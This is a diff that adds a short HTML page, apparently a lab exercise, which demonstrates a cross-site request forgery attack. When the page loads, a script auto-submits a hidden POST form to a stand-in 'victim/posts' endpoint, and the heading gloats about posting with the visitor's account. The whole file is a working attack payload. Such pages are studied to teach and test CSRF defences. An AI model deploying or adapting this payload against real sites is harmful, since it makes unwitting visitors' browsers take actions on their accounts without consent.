@@ -1,0 +1,23 @@
+<!doctype html>
+<html><body>
+    <h3> I posted "doomed" with your account! </h3>
+    <!-- Fill me -->
+
+ <form id="myform" name="hack" 
+	action="http://example.org:8888/victim/posts" method="POST">
+<input type="text"
+  id="post_victim"
+  name="post_victim"
+  value="hack here!"
+   />
+
+ </form>
+
+<script>
+	document.body.onload = function () {
+		document.hack.submit();
+	}
+
+</script>
+
+</body></html>
